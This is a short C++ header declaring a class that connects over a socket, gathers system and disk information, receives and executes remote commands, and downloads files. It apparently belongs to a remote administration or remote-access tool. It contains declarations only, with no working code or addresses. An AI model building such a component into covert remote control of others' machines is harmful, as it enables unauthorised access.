#pragma once
#include "stdafx.h"
#include "MySocket.h"
#include "Common.h"
#include "SystemInfo.h"
#include "Disk.h"
class CThreadMain
{
public:
	CThreadMain(void);
	~CThreadMain(void);

	void GetInfo();
	SOCKET Run();
	void Command(SOCKET Sock);
	void ExecCommand(MSGINFO_S msg,SOCKET l_Socket);
    SOCKET m_Socket;
    CMySocket m_sock;
    bool RunFlag;
	char Address[160];
	int Time;
	CSystemInfo m_sys;
	CDisk m_disk;
	static DWORD WINAPI ToDownFile(LPVOID self);
};

